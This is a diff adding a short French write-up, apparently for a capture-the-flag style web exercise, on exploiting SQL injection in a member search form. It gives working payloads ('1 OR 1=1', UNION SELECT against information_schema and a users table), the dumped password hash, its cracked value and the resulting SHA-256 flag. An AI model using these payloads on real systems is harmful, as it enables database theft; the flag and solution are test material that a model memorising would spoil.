@@ -1,0 +1,31 @@
+En faisaint une recher de membre on peut s'apercevoir que celle ci est vulnérable à une injection SQL,
+en tapant 1 OR 1=1 on peut voir que la requête retourne tous les membres de la base de données.
+
+1 OR 1 = 1 est une expression booléenne qui est toujours vraie, donc a partir d'une requetes que l'on peut imaginer comme celle ci:
+
+SELECT id, firstname, surname FROM users WHERE id = $_GET['id'];
+
+qui va donc donner : 
+
+SELECT id, firstname, surname FROM users WHERE id = 1 OR 1 = 1;
+
+qui va donc retourner tous les membres de la base de données.
+
+L'opérateur UNION permet de combiner les résultats de plusieurs requêtes SQL en une seule.
+On peut faire une requête de ce type pour récupérer le nom de la table et des colonnes de la base de données:
+1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns;
+
+apres exploration de la db on peut trouver dans la table users et dans le champs commentaire :
+1 OR 1=1 UNION SELECT Commentaire, countersign from users 
+
+ID: 1 OR 1=1 UNION SELECT Commentaire, countersign from users  
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+On peut donc en déduire que le mot de passe est chiffré en md5 (hexadecimal et 32 caractere)
+
+md5 -> FortyTwo
+fortytwo en Sh256 -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+Risque :
+- Un attaquant peut recuperer des informations confidentielles dans la base de données
